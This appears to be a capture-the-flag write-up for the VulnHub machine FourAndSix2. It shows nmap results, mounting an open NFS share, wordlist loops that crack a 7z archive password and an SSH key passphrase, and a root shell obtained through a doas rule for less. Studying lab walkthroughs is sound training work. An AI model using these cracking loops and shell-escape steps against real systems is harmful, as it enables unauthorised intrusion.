FourAndSix2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Mounting NFS share
[+] 7z password cracking online
[+] Cracking id_rsa password
[+] Privilege Escalation abusing SUID file
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.106
Host is up (0.00034s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3         2049/tcp  nfs
|   100003  2,3         2049/udp  nfs
|   100005  1,3          782/udp  mountd
|_  100005  1,3          851/tcp  mountd
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: OpenBSD 6.X
OS CPE: cpe:/o:openbsd:openbsd:6
OS details: OpenBSD 6.0 - 6.1
Network Distance: 1 hop

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Mount Present

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ showmount -e 192.168.56.106
Export list for 192.168.56.106:
/home/user/storage (everyone)
setrus@host:~$ sudo mount -t nfs 192.168.56.106:/home/user/storage /mnt/462/
setrus@host:~$ ls /mnt/462
backup.7z
setrus@host:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Tha zip is password protected. John was not able to crack the password but we were able to get the zip dearchived with password :  chocolate
https://www.lostmypass.com/file-types/7z/


ZIP PASSWORD CRACKING
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/fourandsix2/642.png)

We get the account to login to the server 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2
root@setrus:~# ssh user@192.168.56.106 -i id_rsa
Enter passphrase for key 'id_rsa': 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


There is a password for id_rsa :  123456789

id_rsa Password Cracking
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Account user:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh user@192.168.56.106 -i id_rsa
Enter passphrase for key 'id_rsa': 
Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

fourandsix2$ id
uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
fourandsix2$ find / -perm -u=s -type f 2>/dev/null 
/usr/bin/chfn
/usr/bin/chpass
/usr/bin/chsh
/usr/bin/doas
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/passwd
/usr/bin/su
/usr/libexec/lockspool
/usr/libexec/ssh-keysign
/usr/sbin/authpf
/usr/sbin/authpf-noip
/usr/sbin/pppd
/usr/sbin/traceroute
/usr/sbin/traceroute6
/sbin/ping
/sbin/ping6
/sbin/shutdown


ourandsix2$ cat /etc/doas.conf                                                
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root


fourandsix2$ doas /usr/bin/less /var/log/authlog
/var/log/authlog already locked, session is read-only
Press Enter to continue: 

v (to get into vi)

:!sh 

Press any key to continue [: to enter more ex commands]: 
fourandsix2# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
fourandsix2# 



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~





